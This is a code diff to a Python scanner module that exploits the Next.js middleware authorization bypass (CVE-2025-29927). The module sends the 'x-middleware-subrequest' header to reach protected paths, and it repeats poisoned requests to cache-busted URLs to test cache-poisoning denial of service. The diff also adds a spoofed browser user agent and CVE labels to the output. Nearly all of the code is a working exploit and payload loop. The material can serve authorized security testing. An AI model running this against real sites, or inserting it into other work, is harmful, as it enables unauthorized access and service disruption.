@@ -5,7 +5,8 @@
 https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
 """
 
-from modules.utils import requests, random, sys, configure_logger, re, Identify
+from utils.utils import requests, random, sys, configure_logger, re, urlparse
+from utils.style import Identify
 
 logger = configure_logger(__name__)
 
@@ -67,20 +68,20 @@ def follow_redirects(url):
 def bypass_auth(url_p, req):
     for middleware_name in middleware_names:
         headers = {
-        'User-Agent': 'Mozilla/5.0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko',
         'x-middleware-subrequest': middleware_name
         }
         try:
             req_bypass = requests.get(url_p, headers=headers, verify=False, timeout=10, allow_redirects=False)
             #print(f"{url_p} :: {req_bypass}")                  
             if req_bypass.status_code not in range(300, 500) and req_bypass.status_code != req.status_code:
-                print(f" {Identify.confirmed} | BYPASS {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                print(f" {Identify.confirmed} | CVE-2025-29927 {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
         except Exception as e:
             #traceback.print_exc()
             pass
 
 
-def detect_response(url, req_main, headers):
+def detect_response(url, s, req_main, headers):
     if re.search(r'\/([^/]+(?:\.[a-z]+)?|[^/]+$)', url):
         if req_main.status_code in range(300, 310):
             fr = follow_redirects(url)
@@ -93,7 +94,7 @@ def detect_response(url, req_main, headers):
         url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
     for path in paths:
         url_p = url + path
-        req_check = requests.get(url_p, headers=headers, verify=False, timeout=10, allow_redirects=False)
+        req_check = s.get(url_p, verify=False, timeout=10, allow_redirects=False)
         try:
             if req_check.status_code in range(300, 310):
                 #print(f"{url} :: {follow_redirects(url)}")
@@ -113,18 +114,18 @@ def cache_p(url, req_main, headers):
         if req_cb.status_code in [307, 308, 304, 301, 302]:
             for middleware_name in middleware_names:
                 headers = {
-                    'User-Agent': 'Mozilla/5.0',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko',
                     'x-middleware-subrequest': middleware_name
                     }
                 url_cp = f"{url}?cb={random.randrange(999)}"
                 req_cp = requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                 if req_cp.status_code not in [307, 308, 304, 301, 302]:
-                    print(f" {Identify.behavior} | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                    print(f" {Identify.behavior} | CVE-2025-29927 {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
                     for _ in range(0, 5):
                         requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                     req_cp_verify = requests.get(url_cp, verify=False, timeout=10, allow_redirects=False)
                     if req_cp.status_code == req_cp_verify.status_code:
-                        print(f" {Identify.behavior} | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                        print(f" {Identify.behavior} | CVE-2025-29927 {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
     except requests.Timeout:
         #print(f"request timeout {url} {p}")
         pass
@@ -133,10 +134,10 @@ def cache_p(url, req_main, headers):
         pass
 
 
-def middleware(url):
+def middleware(url, s, headers):
     try:
-        req_main = requests.get(url, headers=headers, verify=False, timeout=10, allow_redirects=False)
-        detect_response(url, req_main, headers)
+        req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)
+        detect_response(url, s, req_main, headers)
         cache_p(url, req_main, headers)
     except KeyboardInterrupt:
         print("Exiting")
